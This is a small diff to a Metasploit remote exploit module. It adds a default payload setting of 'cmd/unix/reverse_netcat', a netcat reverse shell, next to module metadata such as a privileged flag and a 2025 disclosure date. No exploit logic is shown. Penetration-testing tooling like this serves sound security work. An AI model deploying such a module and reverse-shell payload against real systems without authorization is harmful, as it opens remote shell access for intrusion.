@@ -81,6 +81,7 @@ class MetasploitModule < Msf::Exploit::Remote
             }
           ]
         ],
+        'DefaultOptions'  => { 'PAYLOAD' => 'cmd/unix/reverse_netcat' },
         'Privileged'      => true,
         'DisclosureDate'  => '2025-11-16',
         'DefaultTarget'   => 0,
